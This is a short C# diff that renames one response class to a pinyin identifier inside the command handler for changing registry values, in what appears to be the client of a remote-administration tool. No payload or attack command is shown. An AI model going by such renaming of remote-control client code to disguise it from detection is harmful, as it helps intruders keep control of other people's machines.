@@ -207,7 +207,7 @@ namespace Rouzzf.Client.Messages
 
         private void Execute(ISender client, DoChangeRegistryValue message)
         {
-            GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
+            GetChangeZhuCeBiaoValueResponse responsePacket = new GetChangeZhuCeBiaoValueResponse();
             string errorMsg;
             try
             {
